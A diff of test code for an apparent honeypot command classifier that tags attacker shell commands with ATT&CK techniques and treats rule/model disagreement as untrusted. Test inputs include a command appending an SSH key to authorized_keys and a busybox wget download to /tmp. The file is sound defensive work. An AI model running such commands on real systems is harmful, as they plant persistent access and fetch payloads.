@@ -224,7 +224,9 @@ def test_notebook_classifier_rule_merge_and_noise_filter() -> None:
     classifier = NotebookParityClassifier(bert_fn=wrong_high_bert, high_confidence=0.55)
     result = classifier.classify("echo ssh-rsa AAA >> ~/.ssh/authorized_keys")
     assert result[0]["ttp"] == "T1098"
-    assert result[0]["source"] == "both"
+    assert result[0]["source"] == "rule_securebert_disagreement"
+    assert result[0]["agreement_status"] == "technique_and_tactic_disagreement"
+    assert is_trusted_classification_event(result[0]) is False
     assert result[0]["bert_ttp"] == "T1087"
 
     assert is_shell_noise("exit") is True
@@ -1394,7 +1396,7 @@ def test_low_confidence_classification_is_audit_only_across_prediction_and_repor
     assert report["ttps"] == []
     assert report["tactics"] == []
     assert report["threat_hypothesis"]["hypothesis_status"] == "insufficient_evidence"
-    assert report["threat_hypothesis"]["analytical_evidence_strength"]["level"] == "Low"
+    assert report["threat_hypothesis"]["analytical_evidence_strength"]["level"] == "Unscored"
 
 
 def test_audit_only_classification_cannot_enter_secondary_consumers_or_model_training() -> None:
@@ -1567,9 +1569,10 @@ def test_post_session_strength_and_follow_on_are_explicitly_non_probabilistic() 
         urls = []
 
     strength = _build_analytical_confidence([], [], Bundle(), ai_enriched=False)
-    assert strength["metric_name"] == "analytical_evidence_strength"
+    assert strength["metric_name"] == "claim_evidence_summary"
     assert strength["calibrated_probability"] is False
-    assert "not a calibrated prediction probability" in strength["description"]
+    assert strength["deprecated"] is True
+    assert "evidence_status" in strength["description"]
     assert _predict_next_action({}, Bundle(), {}) == (
         "Insufficient evidence to construct a falsifiable follow-on hypothesis."
     )
@@ -1727,8 +1730,8 @@ def test_downloader_command_without_download_event_is_candidate_and_falsifiable(
         Bundle(),
         {"command-and-control": ["T1105"]},
     )
-    assert follow_on.startswith("Possible follow-on execution")
-    assert "not confirmed" in follow_on
+    assert follow_on.startswith("Possible later execution")
+    assert "not established" in follow_on
     assert "confirmed execution" not in follow_on.lower()
 
     falsifiers = _build_falsification_conditions(
@@ -1736,9 +1739,9 @@ def test_downloader_command_without_download_event_is_candidate_and_falsifiable(
         Bundle(),
         raw_events=payload["raw_events"],
     )
-    assert any("no downloaded or staged artifact is executed" in item for item in falsifiers)
-    assert any("persistence follow-on hypothesis is falsified" in item for item in falsifiers)
-    assert any("no `cowrie.session.file_download` event" in item for item in falsifiers)
+    assert any("No subsequent explicit artifact-execution" in item for item in falsifiers)
+    assert any("No account, SSH-key" in item for item in falsifiers)
+    assert any("No `cowrie.session.file_download` event" in item for item in falsifiers)
 
     profile = _build_evidence_grounded_actor_profile(
         {"command-and-control": ["T1105"]},
@@ -3920,12 +3923,12 @@ def test_external_seed_builder_accepts_rule_securebert_tactic_agreement() -> Non
 
         quality = model["classification_quality"]
         assert quality["source_counts"]["both_agree"] == 1
-        assert quality["source_counts"]["both_tactic_agree"] == 1
-        assert quality["disagreement_commands_skipped"] == 0
-        assert quality["accepted_command_events"] == 2
+        assert quality["source_counts"]["both_tactic_disagree"] == 1
+        assert quality["disagreement_commands_skipped"] == 1
+        assert quality["accepted_command_events"] == 1
         review_doc = json.loads(review_output.read_text(encoding="utf-8"))
         review_reasons = {item["reason"] for item in review_doc["review_records"]}
-        assert "classifier_disagreement" not in review_reasons
+        assert "classifier_disagreement" in review_reasons
 
 
 def test_primary_transition_chronological_evaluation_compares_current_architecture_and_baselines() -> None:
@@ -6161,8 +6164,8 @@ def test_opaque_securebert_busybox_probe_is_audit_only_without_blocking_real_bus
 
     downloader = classifier.classify("busybox wget http://example.invalid/a -O /tmp/a")[0]
     assert downloader["ttp"] == "T1105"
-    assert downloader["source"] == "both"
-    assert is_trusted_classification_event(downloader) is True
+    assert downloader["source"] == "rule_securebert_disagreement"
+    assert is_trusted_classification_event(downloader) is False
 
 
 def test_reviewed_discovery_rules_cover_audited_common_honeypot_commands() -> None:
